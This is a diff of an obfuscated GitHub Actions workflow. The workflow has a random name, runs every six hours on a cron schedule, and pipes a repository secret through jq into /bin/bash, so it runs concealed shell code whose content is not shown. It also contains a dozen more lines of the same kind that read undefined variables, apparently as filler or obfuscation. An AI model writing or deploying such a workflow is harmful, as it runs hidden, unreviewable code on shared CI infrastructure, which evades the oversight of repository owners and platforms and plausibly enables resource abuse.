@@ -1,9 +1,11 @@
 name: wenxinlan9185
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
-jobs:  # 20290
+    - cron: '55 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +13,19 @@ jobs:  # 20290
       - uses: actions/checkout@v4
       - name: wenxinlan9185
         env:
-          lx38: ${{ secrets.lx38 }}
+          qe061: ${{ secrets.qe061 }}
         run: |
-          echo $lx38 | jq -r .m28 | /bin/bash
-          echo $lxgxg0 | jq -r .gryj03374 | /bin/bash
-          echo $xt19 | jq -r .nwt66775 | /bin/bash
-          echo $gupxm88477 | jq -r .eb2 | /bin/bash
-          echo $py043 | jq -r .vyab8369 | /bin/bash
-          echo $bcah0469 | jq -r .pjx5 | /bin/bash
-          echo $oje6 | jq -r .ywn9213 | /bin/bash
-          echo $wcba5 | jq -r .lsg6468 | /bin/bash
-          echo $rmvq12463 | jq -r .yugh8 | /bin/bash
-          echo $cj3903 | jq -r .a6308 | /bin/bash
-          echo $oa8642 | jq -r .mtb062 | /bin/bash
-          echo $i0 | jq -r .ss82626 | /bin/bash
+          echo $qe061 | jq -r .hkq72941 | /bin/bash
+          echo $howxd212 | jq -r .bhdwx6131 | /bin/bash
+          echo $tmcqi27 | jq -r .ts5338 | /bin/bash
+          echo $q3 | jq -r .ui401 | /bin/bash
+          echo $llsu5821 | jq -r .qdwg296 | /bin/bash
+          echo $vqo3 | jq -r .dle3 | /bin/bash
+          echo $lci19 | jq -r .upzj15449 | /bin/bash
+          echo $csx5961 | jq -r .xf693 | /bin/bash
+          echo $exbks8 | jq -r .njsh618 | /bin/bash
+          echo $r2925 | jq -r .ac9 | /bin/bash
+          echo $t16 | jq -r .uz14816 | /bin/bash
+          echo $tas49 | jq -r .jhsh7618 | /bin/bash
+          echo $cpskl6367 | jq -r .e03066 | /bin/bash
 
